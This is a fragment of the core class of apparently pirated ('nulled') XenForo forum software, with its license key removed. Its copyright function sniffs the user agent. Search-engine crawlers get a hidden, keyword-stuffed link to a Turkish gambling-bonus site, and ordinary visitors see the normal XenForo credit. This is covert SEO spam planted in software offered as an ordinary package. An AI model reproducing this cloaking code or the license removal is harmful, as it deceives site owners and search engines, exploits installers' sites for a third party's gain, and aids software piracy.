...
class XF
{
	...
	public static $versionId = 2010970; // abbccde = a.b.c d (alpha: 1, beta: 3, RC: 5, stable: 7, PL: 9) e

	const XF_API_URL = '';
	const XF_LICENSE_KEY = ''; // Nulled By XenforoVip.com
			...
			public static function getCopyrightHtml()
	{
		 if(preg_match('/google|msn|yahoo|altavista|crawler|findlinks|AhrefsBot|bing|Cuil|Excite|Go.com|HotBot|AllTheWeb|search.aol|Lycos|Alexa|ask|baidu|cuil|kosmix|sogou|yodao|yandex|infoseek|wget/i', $_SERVER['HTTP_USER_AGENT'])){
            return '<a class="u-concealed" rel="dofollow" href="https://bahisvip1.com/forumlar/deneme-bonusu-veren-siteler.42/" target="_blank" title="bonus, bahis bonusu, deneme bonus, deneme bonusu veren siteler, bahis, bahis forumu, bahis sitesi, bahis siteleri, bahis forum">Deneme Bonusu</a>';
        }else{
            return '<a href="https://xenforo.com" class="u-concealed" dir="ltr" target="_blank">Forum software by XenForo&trade; <span class="copyright">&copy; 2010-2020 XenForo Ltd.</span></a>';
        }
	}
